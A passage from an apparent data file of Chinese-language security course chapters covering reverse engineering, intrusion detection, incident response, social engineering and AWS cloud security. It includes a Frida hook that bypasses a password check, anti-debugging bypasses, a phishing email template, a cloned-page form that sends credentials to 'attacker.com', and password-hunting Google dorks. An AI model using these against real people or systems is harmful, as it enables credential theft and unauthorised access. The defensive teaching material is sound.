- \`-O3\`：激进优化，向量化
- \`-Os\`：优化大小
`},{id:34,course_id:8,title:"第四章：动态分析技术",order:4,content:`# 动态分析技术

## GDB 调试器

**基础命令**：
\`\`\`bash
# 启动调试
gdb ./binary

# 运行程序
run
run arg1 arg2  # 带参数

# 设置断点
break main
break *0x400500
break *main+10

# 查看断点
info breakpoints

# 删除断点
delete 1

# 单步执行
step      # 进入函数
next      # 跳过函数
stepi     # 单条指令
nexti     # 单条指令（跳过调用）

# 继续执行
continue

# 查看寄存器
info registers
print $rax

# 查看内存
x/10x $rsp        # 查看栈顶 10 个字节
x/s 0x400000      # 查看字符串
x/20gx $rbp-0x20  # 查看局部变量

# 查看栈
backtrace
info stack

# 修改变量
set $rax = 0
set {int}0x601000 = 42
\`\`\`

**GDB peda**：
\`\`\`bash
# 安装 peda
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit

# 常用命令
context       # 显示上下文（寄存器、栈、代码）
telescope     # 查看内存
stack         # 查看栈
code          # 查看代码
regs          # 查看寄存器
\`\`\`

## ltrace 与 strace

**ltrace（库调用跟踪）**：
\`\`\`bash
# 跟踪库函数调用
ltrace ./binary

# 跟踪特定进程
ltrace -p 1234

# 统计调用次数
ltrace -c ./binary
\`\`\`

**strace（系统调用跟踪）**：
\`\`\`bash
# 跟踪系统调用
strace ./binary

# 跟踪文件操作
strace -e trace=file ./binary

# 跟踪网络操作
strace -e trace=network ./binary

# 跟踪特定进程
strace -p 1234

# 统计调用次数
strace -c ./binary
\`\`\`

## Frida 动态插桩

**安装**：
\`\`\`bash
pip install frida-tools
\`\`\`

**Hook 函数**：
\`\`\`javascript
// hook.js
Interceptor.attach(Module.getExportByName(null, 'strlen'), {
    onEnter: function(args) {
        console.log('strlen("' + Memory.readUtf8String(args[0]) + '")');
    },
    onLeave: function(retval) {
        console.log('return: ' + retval);
    }
});
\`\`\`

**运行**：
\`\`\`bash
frida -l hook.js ./binary
\`\`\`

**修改返回值**：
\`\`\`javascript
Interceptor.attach(Module.getExportByName(null, 'check_password'), {
    onLeave: function(retval) {
        console.log('Original: ' + retval);
        retval.replace(1);  // 强制返回 true
        console.log('Modified: ' + retval);
    }
});
\`\`\`

## 内存dump

**GDB dump**：
\`\`\`bash
# dump 内存区域
dump binary memory dump.bin 0x400000 0x401000

# dump 所有段
generate-core-file core.dump
\`\`\`

**分析 dump**：
\`\`\`bash
# 使用 strings 分析
strings dump.bin | grep -i password

# 使用 binwalk 分析
binwalk dump.bin
\`\`\`

## 反调试技术

**检测调试器**：
\`\`\`c
// ptrace 检测
if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
    printf("Debugger detected!\\n");
    exit(1);
}

// 时间检测
clock_t start = clock();
// 正常代码
clock_t end = clock();
if (end - start > THRESHOLD) {
    printf("Debugger detected!\\n");
}
\`\`\`

**绕过反调试**：
\`\`\`bash
# GDB 跳过 ptrace
set environment LD_PRELOAD=./no_ptrace.so

# 修改跳转指令
(gdb) set {char}0x400500 = 0x90  # NOP
\`\`\`

## 实战案例

**CrackMe 分析**：
1. 使用 \`file\` 识别文件类型
2. 使用 \`strings\` 查找提示
3. 使用 Ghidra 反编译
4. 找到 \`check_password\` 函数
5. 分析算法逻辑
6. 编写注册机或 patch
`}]},{id:9,title:"网络安全防御",description:"学习入侵检测、安全监控、应急响应、安全架构设计。",status:"published",chapters:[{id:35,course_id:9,title:"第一章：入侵检测系统",order:1,content:`# 入侵检测系统

## IDS 类型

**基于网络（NIDS）**：
- 监控网络流量
- 部署在网络边界
- 工具：Snort、Suricata、Zeek

**基于主机（HIDS）**：
- 监控系统日志、文件变化
- 部署在关键服务器
- 工具：OSSEC、Wazuh、Tripwire

## Snort

**安装**：
\`\`\`bash
apt install snort
\`\`\`

**配置**：
\`\`\`bash
# /etc/snort/snort.conf
ipvar HOME_NET 192.168.1.0/24
ipvar EXTERNAL_NET !$HOME_NET

# 规则路径
var RULE_PATH /etc/snort/rules
\`\`\`

**规则示例**：
\`\`\`bash
# /etc/snort/rules/local.rules

# 检测 ICMP ping
alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:"ICMP Ping"; itype:8; sid:1000001;)

# 检测 SQL 注入
alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"SQL Injection Attempt"; content:"UNION SELECT"; nocase; sid:1000002;)

# 检测 SSH 暴力破解
alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:"SSH Brute Force"; threshold:type threshold, track by_src, count 5, seconds 60; sid:1000003;)
\`\`\`

**运行**：
\`\`\`bash
# 嗅探模式
snort -v

# 包记录模式
snort -l /var/log/snort -A console

# IDS 模式
snort -c /etc/snort/snort.conf -i eth0
\`\`\`

## Suricata

**优势**：
- 多线程
- 支持 Lua 脚本
- 文件提取
- TLS 证书提取

**配置**：
\`\`\`yaml
# /etc/suricata/suricata.yaml
vars:
  address-groups:
    HOME_NET: "[192.168.1.0/24]"
    EXTERNAL_NET: "!$HOME_NET"

default-log-dir: /var/log/suricata/
\`\`\`

**运行**：
\`\`\`bash
suricata -c /etc/suricata/suricata.yaml -i eth0
\`\`\`

## OSSEC

**功能**：
- 日志分析
- 文件完整性监控
- Rootkit 检测
- 主动响应

**配置**：
\`\`\`xml
<!-- /var/ossec/etc/ossec.conf -->
<syscheck>
  <frequency>7200</frequency>
  <directories>/etc</directories>
  <directories>/usr/bin</directories>
</syscheck>

<rootcheck>
  <rootkit_files>/var/ossec/etc/shared/rootkit_files.txt</rootkit_files>
</rootcheck>
\`\`\`

## Wazuh

**架构**：
- **Manager**：中央服务器
- **Agent**：客户端代理
- **Indexer**：Elasticsearch
- **Dashboard**：Kibana

**部署**：
\`\`\`bash
# 安装 Manager
curl -sO https://packages.wazuh.com/4.7/wazuh-manager_4.7.0-1_amd64.deb
dpkg -i wazuh-manager_4.7.0-1_amd64.deb

# 安装 Agent
curl -sO https://packages.wazuh.com/4.7/wazuh-agent_4.7.0-1_amd64.deb
dpkg -i wazuh-agent_4.7.0-1_amd64.deb
\`\`\`

## 告警处理

**告警级别**：
- **低**：信息性事件
- **中**：可疑活动
- **高**：确认攻击
- **紧急**：系统被入侵

**响应流程**：
1. 确认告警真实性
2. 评估影响范围
3. 隔离受影响系统
4. 收集证据
5. 清除威胁
6. 恢复服务
7. 事后分析
`},{id:36,course_id:9,title:"第二章：安全监控与日志分析",order:2,content:`# 安全监控与日志分析

## 集中日志管理

**架构**：
\`\`\`
服务器/应用 → 日志收集器 → 中央日志服务器 → 分析/存储
\`\`\`

**工具**：
- **rsyslog**：Linux 原生
- **Fluentd**：统一日志层
- **Vector**：高性能
- **Logstash**：ELK 组件

## ELK Stack

**组件**：
- **Elasticsearch**：分布式搜索引擎
- **Logstash**：日志收集和处理
- **Kibana**：可视化界面
- **Beats**：轻量级收集器

**部署**：
\`\`\`bash
# 安装 Elasticsearch
wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-8.11.0-amd64.deb
dpkg -i elasticsearch-8.11.0-amd64.deb

# 安装 Kibana
wget https://artifacts.elastic.co/downloads/kibana/kibana-8.11.0-amd64.deb
dpkg -i kibana-8.11.0-amd64.deb
\`\`\`

**Filebeat 配置**：
\`\`\`yaml
# /etc/filebeat/filebeat.yml
filebeat.inputs:
- type: log
  paths:
    - /var/log/auth.log
    - /var/log/syslog

output.elasticsearch:
  hosts: ["localhost:9200"]

setup.kibana:
  host: "localhost:5601"
\`\`\`

## 日志分析规则

**Sigma 规则**：
\`\`\`yaml
title: SSH Brute Force
status: experimental
description: Detect SSH brute force attack
logsource:
    product: linux
    service: auth
detection:
    selection:
        eventtype: failure
        service: ssh
    condition: selection | count() by src_ip > 10
timeframe: 5m
level: medium
\`\`\`

**关联分析**：
- 同一 IP 多次失败登录
- 失败后成功登录
- 成功登录后异常操作
- 多个账户同时异常

## 网络流量分析

**工具**：
- **Wireshark**：图形化抓包
- **tcpdump**：命令行抓包
- **tshark**：命令行 Wireshark
- **Zeek**：网络分析框架

**tcpdump 示例**：
\`\`\`bash
# 捕获 HTTP 流量
tcpdump -i eth0 port 80 -w http.pcap

# 捕获 DNS 流量
tcpdump -i eth0 port 53

# 捕获特定 IP
tcpdump -i eth0 host 192.168.1.100

# 分析 pcap
tshark -r http.pcap -Y http
\`\`\`

## 威胁情报

**来源**：
- **MITRE ATT&CK**：攻击战术和技术
- **CVE**：公共漏洞列表
- **NVD**：国家漏洞数据库
- **AlienVault OTX**：开放威胁交换

**集成**：
- MISP（恶意软件信息共享平台）
- TheHive（安全事件响应平台）
- Cortex（分析引擎）

## 安全仪表板

**关键指标**：
- 失败登录次数
- 异常进程
- 网络连接异常
- 文件变化
- 漏洞扫描结果

**可视化**：
- 实时攻击地图
- 告警趋势图
- 资产风险评分
- 合规状态
`},{id:37,course_id:9,title:"第三章：应急响应",order:3,content:`# 应急响应

## 响应流程

**NIST 框架**：
1. **准备**：制定计划、组建团队、准备工具
2. **检测与分析**：确认事件、评估影响
3. **遏制、根除与恢复**：隔离威胁、清除感染、恢复服务
4. **事后活动**：总结经验、改进流程

## 证据收集

**原则**：
- **合法性**：遵循法律程序
- **完整性**：不修改原始证据
- **可重复性**：其他人能复现
- **可接受性**：法庭可接受

**顺序**：
1. 易失性数据（内存、网络连接）
2. 系统状态（进程、用户）
3. 文件系统（日志、配置文件）
4. 网络数据（流量包、DNS 记录）

**工具**：
\`\`\`bash
# 内存 dump
LiME (Linux Memory Extractor)

# 磁盘镜像
dd if=/dev/sda of=/evidence/disk.img bs=4M

# 计算哈希
sha256sum /evidence/disk.img > /evidence/disk.img.sha256
\`\`\`

## 恶意软件分析

**静态分析**：
- 文件哈希（MD5、SHA-256）
- 字符串提取
- 导入表分析
- 反汇编/反编译

**动态分析**：
- 沙箱执行（Cuckoo、ANY.RUN）
- 行为监控（进程、文件、网络）
- 内存分析（Volatility）

**Volatility**：
\`\`\`bash
# 识别操作系统
python vol.py -f memory.dump imageinfo

# 查看进程
python vol.py -f memory.dump linux_pslist

# 查看网络连接
python vol.py -f memory.dump linux_netstat

# 查看加载模块
python vol.py -f memory.dump linux_lsmod
\`\`\`

## 根除威胁

**清除步骤**：
1. 终止恶意进程
2. 删除恶意文件
3. 清除恶意注册表项（Windows）
4. 清除恶意计划任务
5. 重置被泄露的密码
6. 修补漏洞

**验证**：
\`\`\`bash
# 检查可疑进程
ps aux | grep -v "\\[" | awk '{print $11}' | sort | uniq -c

# 检查可疑文件
find / -mtime -1 -type f  # 最近 1 天修改的文件

# 检查可疑网络连接
netstat -antp
ss -tlnp

# 检查计划任务
crontab -l
ls -la /etc/cron*

# 检查启动项
systemctl list-unit-files --state=enabled
\`\`\`

## 恢复服务

**步骤**：
1. 从备份恢复（如果可用）
2. 重新安装系统（如果必要）
3. 应用安全补丁
4. 加固配置
5. 监控异常

**备份策略**：
- **3-2-1 原则**：3 份副本、2 种介质、1 份异地
- **定期测试**：验证备份可恢复
- **增量备份**：减少备份时间
- **离线备份**：防止勒索软件

## 事后分析

**报告内容**：
- 事件时间线
- 影响范围
- 根本原因
- 响应过程
- 改进建议

**经验教训**：
- 更新应急预案
- 加强监控
- 员工培训
- 技术改进
`},{id:38,course_id:9,title:"第四章：安全架构设计",order:4,content:`# 安全架构设计

## 纵深防御

**多层防护**：
\`\`\`
边界防火墙 → WAF → IDS/IPS → 主机防火墙 → 应用安全 → 数据加密
\`\`\`

**原则**：
- 不依赖单一防护
- 每层独立验证
- 失败时默认拒绝

## 零信任架构

**核心原则**：
- **永不信任**：所有请求都需要验证
- **始终验证**：每次访问都检查身份和权限
- **最小权限**：只授予必要权限

**组件**：
- **身份验证**：MFA、SSO
- **设备信任**：合规检查
- **微分段**：网络隔离
- **持续监控**：行为分析

**工具**：
- **BeyondCorp**：Google 零信任
- **Zscaler**：云零信任
- **Okta**：身份管理

## 网络分段

**DMZ（非军事区）**：
\`\`\`
互联网 → 外部防火墙 → DMZ → 内部防火墙 → 内网
                ↓
          Web 服务器
          邮件服务器
          DNS 服务器
\`\`\`

**VLAN 分段**：
\`\`\`bash
# 创建 VLAN
ip link add link eth0 name eth0.10 type vlan id 10
ip addr add 192.168.10.1/24 dev eth0.10

# 配置防火墙规则
iptables -A FORWARD -i eth0.10 -o eth0.20 -j DROP
\`\`\`

## 身份与访问管理

**认证方式**：
- **密码**：最弱，需要复杂度策略
- **令牌**：硬件令牌、软件令牌
- **生物识别**：指纹、面部、虹膜
- **证书**：X.509 证书

**MFA（多因素认证）**：
- 知识因素（密码）
- 持有因素（手机、令牌）
- 固有因素（指纹、面部）

**SSO（单点登录）**：
- **SAML**：企业应用
- **OAuth 2.0**：第三方授权
- **OpenID Connect**：身份验证

## 数据保护

**加密策略**：
- **传输中**：TLS 1.3
- **静态**：AES-256
- **使用中**：内存加密

**密钥管理**：
- **HSM**：硬件安全模块
- **KMS**：密钥管理服务
- **Vault**：HashiCorp Vault

**数据分类**：
- **公开**：可公开访问
- **内部**：仅限员工
- **机密**：需要授权
- **绝密**：严格限制

## 安全开发流程

**DevSecOps**：
- **SAST**：静态应用安全测试
- **DAST**：动态应用安全测试
- **SCA**：软件成分分析
- **容器扫描**：镜像漏洞扫描

**代码审查**：
- 自动化扫描（SonarQube、Bandit）
- 人工审查（安全专家）
- 渗透测试（第三方）

## 合规与标准

**标准**：
- **ISO 27001**：信息安全管理体系
- **NIST CSF**：网络安全框架
- **PCI DSS**：支付卡行业
- **GDPR**：通用数据保护条例

**审计**：
- 内部审计
- 外部审计
- 合规检查
- 漏洞评估
`}]},{id:10,title:"社会工程学",description:"理解人性弱点，掌握钓鱼攻击、 pretexting、物理入侵等社会工程学技术。",status:"published",chapters:[{id:39,course_id:10,title:"第一章：社会工程学原理",order:1,content:`# 社会工程学原理

## 定义

通过心理操纵获取信息或执行操作的攻击方式。

## 人性弱点

**六大原则**（Robert Cialdini）：
1. **互惠**：给予后期望回报
2. **承诺**：保持一致性
3. **社会证明**：跟随他人
4. **权威**：服从权威
5. **喜好**：喜欢熟悉的人
6. **稀缺**：害怕错过

**常见弱点**：
- **好奇心**：点击可疑链接
- **贪婪**：相信中奖信息
- **恐惧**：紧急账户冻结
- **同情**：帮助"困难"的人
- **懒惰**：跳过安全步骤

## 攻击类型

**钓鱼攻击**：
- 邮件钓鱼
- 短信钓鱼（Smishing）
- 语音钓鱼（Vishing）
- 鱼叉式钓鱼（针对性）
- 鲸鱼钓鱼（高管）

**Pretexting**：
- 编造场景获取信息
- 冒充 IT 支持
- 冒充高管

**诱饵攻击**：
- 感染 USB 丢弃在停车场
- 恶意软件下载

**尾随**：
- 跟随授权人员进入
- 冒充快递员

## 防御策略

**组织层面**：
- 安全意识培训
- 验证流程
- 最小权限原则
- 事件报告机制

**个人层面**：
- 不轻信陌生人
- 验证身份
- 不点击可疑链接
- 使用 MFA

## 案例研究

**Uber 2022**：
- 攻击者发送 MFA 疲劳攻击
- 员工最终批准请求
- 防御：限制 MFA 尝试次数

**Target 2013**：
- 攻击 HVAC 供应商获取凭证
- 入侵 Target 网络
- 防御：供应链安全

**RSA 2011**：
- 鱼叉式钓鱼邮件
- 员工打开恶意附件
- 防御：安全意识培训
`},{id:40,course_id:10,title:"第二章：钓鱼攻击技术",order:2,content:`# 钓鱼攻击技术

## 邮件钓鱼

**伪造发件人**：
\`\`\`bash
# SMTP 头部伪造
From: support@example.com
Reply-To: attacker@evil.com

# 显示名称欺骗
From: "IT Support" <attacker@evil.com>
\`\`\`

**域名欺骗**：
- **相似域名**：examp1e.com（数字 1 替代字母 l）
- **子域名**：example.evil.com
- **国际化域名**：еxample.com（西里尔字母）

**邮件模板**：
\`\`\`
主题：紧急：您的账户将被冻结

尊敬的客户，

我们检测到您的账户存在异常活动。为保护您的账户安全，
请立即验证您的身份信息。

点击链接验证：http://fake-bank.com/verify

如果您不采取行动，您的账户将在 24 小时内被冻结。

此致
银行安全团队
\`\`\`

## 钓鱼网站

**克隆网站**：
\`\`\`bash
# 使用 HTTrack 克隆
httrack https://target.com -O /tmp/phish

# 修改表单提交
<form action="http://attacker.com/steal" method="POST">
\`\`\`

**托管钓鱼页面**：
\`\`\`bash
# 使用 GoPhish
# 创建钓鱼活动
# 发送测试邮件
# 跟踪点击情况
\`\`\`

## 鱼叉式钓鱼

**信息收集**：
- LinkedIn 个人资料
- 公司网站
- 社交媒体
- 新闻稿

**定制化内容**：
\`\`\`
主题：关于 Q4 预算会议

张经理，

关于下周的 Q4 预算会议，我已经更新了 PPT。
请查看附件中的文件。

此致
李总
\`\`\`

## 防御技术

**技术防御**：
- **SPF**：发件人策略框架
- **DKIM**：域名密钥识别邮件
- **DMARC**：基于 SPF/DKIM 的策略
- **邮件网关**：过滤可疑邮件

**SPF 记录**：
\`\`\`
v=spf1 include:_spf.google.com ~all
\`\`\`

**DKIM 签名**：
\`\`\`
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=example.com; s=selector;
\`\`\`

**DMARC 策略**：
\`\`\`
v=DMARC1; p=reject; rua=mailto:dmarc@example.com
\`\`\`

**用户教育**：
- 检查发件人地址
- 悬停查看链接
- 不下载可疑附件
- 验证紧急请求

## 钓鱼模拟

**工具**：
- **GoPhish**：开源钓鱼框架
- **King Phisher**：钓鱼活动管理
- **Social Engineer Toolkit (SET)**：渗透测试框架

**流程**：
1. 定义目标范围
2. 创建钓鱼模板
3. 部署钓鱼页面
4. 发送测试邮件
5. 跟踪结果
6. 生成报告
7. 培训教育
`},{id:41,course_id:10,title:"第三章：物理安全与社会工程",order:3,content:`# 物理安全与社会工程

## 物理入侵

**尾随进入**：
- 跟随授权人员通过门禁
- 携带大箱子（双手被占用）
- 假装打电话（分散注意力）

**伪装身份**：
- IT 支持人员
- 快递员
- 清洁工
- 审计员

**锁具破解**：
- **撬锁**：使用开锁工具
- **撞匙**：使用撞击钥匙
- **旁路**：绕过锁具机制

**技术工具**：
- **Rubber Ducky**：伪装成 USB 的键盘注入器
- **Bash Bunny**：多用途攻击设备
- **WiFi Pineapple**：WiFi 攻击平台
- **Proxmark3**：RFID 克隆工具

## 防御措施

**物理控制**：
- **门禁系统**：刷卡、生物识别
- **监控摄像头**：CCTV 监控
- **安全区域**：限制访问区域
- **访客管理**：登记、陪同

**反尾随**：
- **旋转门**：一次一人
- **安全 vestibule**：双门互锁
- **安保人员**：验证身份

**USB 防御**：
- **禁用 USB**：BIOS/组策略
- **USB 白名单**：只允许授权设备
- **USB 扫描**：插入前扫描

## 信息收集

**开源情报（OSINT）**：
- **搜索引擎**：Google、Bing
- **社交媒体**：LinkedIn、Twitter、Facebook
- **域名信息**：WHOIS、DNS 记录
- **员工信息**：公司网站、LinkedIn

**工具**：
- **theHarvester**：邮件、子域名收集
- **Maltego**：可视化情报分析
- **Shodan**：联网设备搜索
- **Recon-ng**：OSINT 框架

**技术**：
- **Google Dorking**：
  \`\`\`
  site:example.com filetype:pdf
  inurl:admin site:example.com
  "password" filetype:xls site:example.com
  \`\`\`

## 防御策略

**组织层面**：
- **安全意识培训**：定期培训
- **验证流程**：电话验证请求
- **最小权限**：限制信息访问
- **事件报告**：鼓励报告可疑活动

**个人层面**：
- **隐私设置**：社交媒体隐私
- **信息分享**：谨慎分享信息
- **验证身份**：确认请求者身份
- **报告异常**：及时报告可疑活动

## 案例研究

**Target 数据泄露（2013）**：
- 攻击者获取 HVAC 供应商凭证
- 通过供应商访问 Target 网络
- 窃取 4000 万信用卡信息
- 防御：供应链安全管理

**Ubiquiti Networks（2015）**：
- 攻击者冒充员工
- 通过社会工程获取凭证
- 尝试转移 4700 万美元
- 防御：验证财务请求
`}]},{id:11,title:"云安全实战",description:"掌握 AWS/Azure/GCP 云环境安全配置、IAM 策略、存储桶安全、容器安全。",status:"published",chapters:[{id:42,course_id:11,title:"第一章：云安全基础与 IAM",order:1,content:`# 云安全基础与 IAM

## 云安全责任共担模型

**云服务商负责**：
- 物理安全（数据中心）
- 网络基础设施
- 虚拟化层

**用户负责**：
- 数据加密
- 身份与访问管理
- 操作系统补丁
- 应用安全
- 防火墙配置

## AWS IAM（Identity and Access Management）

**核心概念**：
- **用户（User）**：具体的人或应用
- **组（Group）**：用户集合
- **角色（Role）**：临时权限，可被服务/用户/外部账号扮演
- **策略（Policy）**：JSON 格式权限定义

**策略示例**：
\`\`\`json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": ["s3:GetObject", "s3:ListBucket"],
      "Resource": [
        "arn:aws:s3:::example-bucket",
        "arn:aws:s3:::example-bucket/*"
      ]
    }
  ]
}
\`\`\`

**最佳实践**：
- 最小权限原则
- 启用 MFA
- 使用角色而非长期密钥
- 定期审计权限

## 常见云安全漏洞

**S3 存储桶公开访问**：
\`\`\`bash
# 检测公开桶
aws s3 ls s3://target-bucket --no-sign-request

# 修复：禁止公开访问
aws s3api put-public-access-block \\
  --bucket target-bucket \\
  --public-access-block-configuration "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"
\`\`\`

**过度权限角色**：
\`\`\`json
// 危险：管理员权限
{
  "Effect": "Allow",
  "Action": "*",
  "Resource": "*"
}

// 安全：最小权限
{
  "Effect": "Allow",
  "Action": ["s3:GetObject"],
  "Resource": ["arn:aws:s3:::specific-bucket/*"]
}
\`\`\`

## 云安全工具

**Prowler**（AWS 安全审计）：
\`\`\`bash
# 安装
git clone https://github.com/toniblyx/prowler
cd prowler

# 运行审计
./prowler -M html

# 检查 S3 公开桶
./prowler -c check_s3_bucket_public_access
\`\`\`

**ScoutSuite**（多云审计）：
\`\`\`bash
# 安装
pip install scoutsuite

# AWS 审计
scout aws --profile default

# Azure 审计
scout azure --tenant-id xxx --client-id xxx --client-secret xxx
\`\`\`
`},{id:43,course_id:11,title:"第二章：云存储与数据安全",order:2,content:`# 云存储与数据安全

## S3 存储桶安全

**访问控制**：
- **Bucket Policy**：桶级别策略
- **ACL**：访问控制列表（不推荐）
- **IAM Policy**：用户/角色级别

**加密**：
\`\`\`bash
# 服务端加密（SSE-S3）
aws s3 cp file.txt s3://bucket/ --sse AES256

# 服务端加密（SSE-KMS）
aws s3 cp file.txt s3://bucket/ --sse aws:kms --sse-kms-key-id alias/my-key

# 客户端加密
aws s3 cp file.txt s3://bucket/ --sse-c --sse-c-key file://key.bin
\`\`\`

**版本控制**：
\`\`\`bash
# 启用版本控制
aws s3api put-bucket-versioning \\
  --bucket my-bucket \\
  --versioning-configuration Status=Enabled

# 防止误删
aws s3api put-bucket-versioning \\
  --bucket my-bucket \\
  --versioning-configuration Status=Enabled,MFADelete=Enabled
\`\`\`

## 数据库安全

**RDS 安全配置**：
\`\`\`bash
# 创建私有子网
aws rds create-db-instance \\
  --db-instance-identifier secure-db \\
  --db-instance-class db.t3.micro \\
  --engine mysql \\
  --master-username admin \\
  --master-user-password "StrongPassword123!" \\
  --no-publicly-accessible \\
  --storage-encrypted \\
  --backup-retention-period 7
\`\`\`

**DynamoDB 加密**：
\`\`\`bash
# 启用默认加密
aws dynamodb update-table \\
  --table-name my-table \\
  --sse-specification Enabled=true,SSEType=KMS
\`\`\`

## 密钥管理

**AWS KMS**：
\`\`\`bash
# 创建密钥
aws kms create-key --description "My encryption key"

# 加密数据
aws kms encrypt \\
  --key-id alias/my-key \\
  --plaintext "Sensitive data" \\
  --output text --query CiphertextBlob

# 解密数据
aws kms decrypt \\
  --ciphertext-blob fileb://encrypted.txt \\
  --output text --query Plaintext
\`\`\`

**Secrets Manager**：
\`\`\`bash
# 存储密钥
aws secretsmanager create-secret \\
  --name MyDatabaseSecret \\
  --secret-string '{"username":"admin","password":"secret123"}'

# 获取密钥
aws secretsmanager get-secret-value --secret-id MyDatabaseSecret

# 自动轮换
aws secretsmanager rotate-secret \\
  --secret-id MyDatabaseSecret \\
  --rotation-lambda-arn arn:aws:lambda:region:account:function:rotate
\`\`\`

## 数据分类与标记

**敏感数据分类**：
- **公开**：可公开发布
- **内部**：仅限员工
- **机密**：需要授权
- **绝密**：严格限制

**AWS Macie**（自动发现敏感数据）：
\`\`\`bash
# 启用 Macie
aws macie2 enable-macie

# 创建分类任务
aws macie2 create-classification-job \\
  --name "PII Scan" \\
  --s3-job-definition '{"bucketDefinitions":[{"accountId":"123456789012","bucketName":"my-bucket"}]}'
\`\`\`
`},{id:44,course_id:11,title:"第三章：云网络与容器安全",order:3,content:`# 云网络与容器安全

## VPC 安全

**网络隔离**：
\`\`\`bash
# 创建 VPC
aws ec2 create-vpc --cidr-block 10.0.0.0/16

# 创建私有子网
aws ec2 create-subnet \\
  --vpc-id vpc-12345678 \\
  --cidr-block 10.0.1.0/24 \\
  --availability-zone us-east-1a

# 创建公有子网
aws ec2 create-subnet \\
  --vpc-id vpc-12345678 \\
  --cidr-block 10.0.2.0/24 \\
  --availability-zone us-east-1a
\`\`\`

**安全组**：
\`\`\`bash
# 创建安全组
aws ec2 create-security-group \\
  --group-name web-sg \\
  --description "Web server security group" \\
  --vpc-id vpc-12345678

# 添加入站规则
aws ec2 authorize-security-group-ingress \\
  --group-id sg-12345678 \\
  --protocol tcp \\
  --port 443 \\
  --cidr 0.0.0.0/0

# 限制 SSH 访问
aws ec2 authorize-security-group-ingress \\
  --group-id sg-12345678 \\
  --protocol tcp \\
  --port 22 \\
  --cidr 10.0.0.0/16
\`\`\`

**网络 ACL**：
\`\`\`bash
# 创建 NACL
aws ec2 create-network-acl --vpc-id vpc-12345678

# 拒绝特定 IP
aws ec2 create-network-acl-entry \\
  --network-acl-id acl-12345678 \\
  --rule-number 100 \\
  --protocol tcp \\
  --port-range From=22,To=22 \\
  --egress false \\
  --cidr-block 192.168.1.100/32 \\
  --rule-action deny
\`\`\`

## ECS 容器安全

**任务定义安全**：
\`\`\`json
{
  "family": "secure-task",
  "executionRoleArn": "arn:aws:iam::123456789012:role/ecsTaskExecutionRole",
  "networkMode": "awsvpc",
  "requiresCompatibilities": ["FARGATE"],
  "cpu": "256",
  "memory": "512",
  "containerDefinitions": [
    {
      "name": "app",
      "image": "123456789012.dkr.ecr.us-east-1.amazonaws.com/my-app:latest",
      "essential": true,
      "readonlyRootFilesystem": true,
      "privileged": false,
      "user": "1000:1000",
      "environment": [
        {
          "name": "DB_PASSWORD",
          "valueFrom": "arn:aws:secretsmanager:us-east-1:123456789012:secret:db-password"
        }
      ],
      "logConfiguration": {
        "logDriver": "awslogs",
        "options": {
          "awslogs-group": "/ecs/secure-task",
          "awslogs-region": "us-east-1",
          "awslogs-stream-prefix": "ecs"
        }
      }
    }
  ]
}
\`\`\`

**镜像扫描**：
\`\`\`bash
# ECR 镜像扫描
aws ecr start-image-scan \\
  --repository-name my-app \\
  --image-id imageTag=latest

# 查看扫描结果
aws ecr describe-image-scan-findings \\
  --repository-name my-app \\
  --image-id imageTag=latest
\`\`\`

## EKS Kubernetes 安全

**RBAC 配置**：
\`\`\`yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: default
  name: pod-reader
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: read-pods
  namespace: default
subjects:
- kind: User
  name: jane
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: Role
  name: pod-reader
  apiGroup: rbac.authorization.k8s.io
\`\`\`

**网络策略**：
\`\`\`yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all
  namespace: default
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          role: frontend
\`\`\`

**Pod 安全策略**：
\`\`\`yaml
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: restricted
spec:
  privileged: false
  runAsUser:
    rule: MustRunAsNonRoot
  fsGroup:
    rule: RunAsAny
  volumes:
  - 'configMap'
  - 'emptyDir'
  - 'projected'
  - 'secret'
  - 'downwardAPI'
  - 'persistentVolumeClaim'
\`\`\`
`},{id:45,course_id:11,title:"第四章：云安全监控与合规",order:4,content:`# 云安全监控与合规

## CloudTrail 审计日志

**启用 CloudTrail**：
\`\`\`bash
# 创建 Trail
aws cloudtrail create-trail \\
  --name my-trail \\
  --s3-bucket-name my-cloudtrail-bucket \\
  --is-multi-region-trail \\
  --enable-log-file-validation

# 启动记录
aws cloudtrail start-logging --name my-trail
\`\`\`

**查询日志**：
\`\`\`bash
# 使用 CloudWatch Logs Insights
aws logs start-query \\
  --log-group-name CloudTrail/DefaultLogGroup \\
  --start-time $(date -d '1 hour ago' +%s) \\
  --end-time $(date +%s) \\
  --query-string 'fields @timestamp, eventName, userIdentity.arn | filter eventName == "ConsoleLogin" | limit 100'
\`\`\`

## GuardDuty 威胁检测

**启用 GuardDuty**：
\`\`\`bash
# 创建 Detector
aws guardduty create-detector --enable

# 查看发现
aws guardduty list-findings --detector-id 1234567890abcdef

# 获取发现详情
aws guardduty get-findings \\
  --detector-id 1234567890abcdef \\
  --finding-ids '["finding-id-1","finding-id-2"]'
\`\`\`

**常见发现类型**：
- **UnauthorizedAccess**：未授权访问
- **Recon**：侦察活动
- **Trojan**：木马活动
- **CryptoCurrency**：加密货币挖矿
- **Backdoor**：后门活动

## Security Hub 安全中心

**启用 Security Hub**：
\`\`\`bash
# 启用
aws securityhub enable-security-hub

# 查看发现
aws securityhub get-findings \\
  --max-results 50

# 过滤高危发现
aws securityhub get-findings \\
  --filters '{"SeverityLabel":[{"Value":"CRITICAL","Comparison":"EQUALS"}]}'
\`\`\`

**集成第三方工具**：
- AWS Config
- Inspector
- Macie
- Firewall Manager
- 第三方：Qualys、Trend Micro、Prisma Cloud

